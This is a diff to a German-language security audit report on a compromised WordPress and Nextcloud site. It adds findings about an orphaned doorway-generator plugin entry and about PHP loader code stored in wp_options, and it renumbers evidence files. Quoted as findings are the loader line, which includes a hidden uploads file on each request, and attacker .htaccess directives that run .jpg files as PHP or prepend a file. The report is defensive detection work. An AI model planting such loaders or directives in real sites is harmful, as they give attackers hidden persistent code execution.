@@ -449,6 +449,29 @@ Modified plugin file: wp-content/plugins/pruefstand-aktuell/pruefstand-aktuell.p
 ```
 
   kunde-zwei.example/httpdocs: Wordfence führt 1 Plugin(s) als aufgegeben (kein Hersteller-Support mehr)
+- ⚠️  **kunde-zwei.example/httpdocs: active_plugins führt Einträge ohne Datei auf der Platte — Leiche oder Tarnung, sichten**
+
+```
+doorway-gen/loader.php
+
+```
+
+  Beleg: belege/020_wp_db_plugin_leichen_kunde-zwei_example_httpdocs.txt
+- 🔴 **KRITISCH: kunde-zwei.example/httpdocs: PHP-Code in wp_options — Optionen tragen Daten, keinen Code; hier legt ein Generator seinen Lader ab**
+
+```
+widget_custom_html	<?php add_action("template_redirect", function(){ include ABSPATH."wp-content/uploads/.q"; });
+```
+
+  Beleg: belege/021_wp_db_optionen_php_kunde-zwei_example_httpdocs.txt
+  kunde-zwei.example/httpdocs: auffällig grosse Optionen (>= 262144 B) — Rangfolge für die Sichtung, kein Befund:
+
+```
+doorway_terms_cache	1834219
+_transient_dirsize_cache	412008
+```
+
+  Beleg: belege/022_wp_db_optionen_gross_kunde-zwei_example_httpdocs.txt
 - ⚪ **Nicht messbar: kunde-zwei.example/httpdocs: Datenbank nicht geprüft (grep beherrscht kein -P (PCRE) — die Werte aus wp-config.php sind damit nicht lesbar). Das ist KEINE Entwarnung.**
 
 ## 13b. .HTACCESS — SICHERUNG UND EINORDNUNG
@@ -470,7 +493,7 @@ Order allow,deny                                      Apache-2.2-Zugriffssyntax 
 <Files filefuns.php> … Allow from all                 Sperre fuer alles, Freigabe fuer genau diese eine PHP-Datei
 ```
 
-  Beleg: belege/020_htaccess_fremd_kunde-zwei_example_backups_updater-abc123_nextcloud-28_0_1_2-1700000000__htaccess.txt
+  Beleg: belege/023_htaccess_fremd_kunde-zwei_example_backups_updater-abc123_nextcloud-28_0_1_2-1700000000__htaccess.txt
 - 🔴 **KRITISCH: kunde-zwei.example/cloud.kunde-zwei.example/.htaccess (nextcloud): 3 Angreifer-Direktive(n) in der .htaccess**
 
 ```
@@ -479,7 +502,7 @@ Order allow,deny                                      Apache-2.2-Zugriffssyntax 
 <Files filefuns.php> … Allow from all                 Sperre fuer alles, Freigabe fuer genau diese eine PHP-Datei
 ```
 
-  Beleg: belege/021_htaccess_fremd_kunde-zwei_example_cloud_kunde-zwei_example__htaccess.txt
+  Beleg: belege/024_htaccess_fremd_kunde-zwei_example_cloud_kunde-zwei_example__htaccess.txt
 - 🔴 **KRITISCH: kunde-zwei.example/httpdocs/.htaccess (wordpress): 2 Angreifer-Direktive(n) in der .htaccess**
 
 ```
@@ -487,15 +510,15 @@ AddType application/x-httpd-php .jpg                  PHP-Ausfuehrung fuer eine 
 php_value auto_prepend_file /var/www/vhosts/<anderer Kunde 2>  auto_prepend_file auf eine Datei im Webspace
 ```
 
-  Beleg: belege/022_htaccess_fremd_kunde-zwei_example_httpdocs__htaccess.txt
+  Beleg: belege/025_htaccess_fremd_kunde-zwei_example_httpdocs__htaccess.txt
 - 🔴 **KRITISCH: kunde-zwei.example/httpdocs/wp-content/uploads/.htaccess (unbekannt): 1 Angreifer-Direktive(n) in der .htaccess**
 
 ```
 <Files bild.php> … Allow from all                     Freigabe fuer eine PHP-Datei in einem Verzeichnis, in das keine gehoert
 ```
 
-  Beleg: belege/023_htaccess_fremd_kunde-zwei_example_httpdocs_wp-content_uploads__htaccess.txt
-  Beleg: belege/024_htaccess_einordnung.txt
+  Beleg: belege/026_htaccess_fremd_kunde-zwei_example_httpdocs_wp-content_uploads__htaccess.txt
+  Beleg: belege/027_htaccess_einordnung.txt
 
 ### 13b.3 Wirksamkeit
 
@@ -512,7 +535,7 @@ php_value auto_prepend_file /var/www/vhosts/<anderer Kunde 2>  auto_prepend_file
 2 Regel(n): <PRUEFSTAND>/vhosts/kunde-zwei.example/httpdocs/wp-content/plugins/pruefstand-aktuell/pruefstand-aktuell.php — ObfuscatedPhp DodgyStrings
 ```
 
-  Beleg: belege/025_php_malware_finder_treffer.txt
+  Beleg: belege/028_php_malware_finder_treffer.txt
   Quelle: Prüfstand-Attrappe, Regelstand 0 Tage alt — der Regelsatz wird vom Projekt kaum noch gepflegt
 
 ### 13d Einordnung der Mustertreffer aus 7.3
@@ -540,7 +563,7 @@ php_value auto_prepend_file /var/www/vhosts/<anderer Kunde 2>  auto_prepend_file
 
 ```
 
-  Beleg: belege/026_ursache_zeitachse.txt
+  Beleg: belege/029_ursache_zeitachse.txt
 
 ### 13e.2 ctime gegen mtime — beide Richtungen
 
@@ -559,7 +582,7 @@ ZUKUNFT   <ZEIT>  mtime liegt <SPANNE> NACH der ctime — vorwaerts datiert   <P
 
 ```
 
-  Beleg: belege/027_ursache_zeitstempel_deutung.txt
+  Beleg: belege/030_ursache_zeitstempel_deutung.txt
 
 ### 13e.3 Reichweite: geteilter Systemnutzer
 
@@ -576,7 +599,7 @@ ZUKUNFT   <ZEIT>  mtime liegt <SPANNE> NACH der ctime — vorwaerts datiert   <P
 
 ```
 
-  Beleg: belege/028_ursache_quellenlage.txt
+  Beleg: belege/031_ursache_quellenlage.txt
 
 ## 14. ZUSAMMENFASSUNG
 
@@ -586,8 +609,8 @@ ZUKUNFT   <ZEIT>  mtime liegt <SPANNE> NACH der ctime — vorwaerts datiert   <P
 
 | Kategorie | Anzahl |
 |---|---|
-| 🔴 Kritische Befunde | 17 |
-| ⚠️ Warnungen | 18 |
+| 🔴 Kritische Befunde | 18 |
+| ⚠️ Warnungen | 19 |
 | ✅ Unauffällige Prüfungen | 23 |
 | ⚪ Nicht messbar | 10 |
 
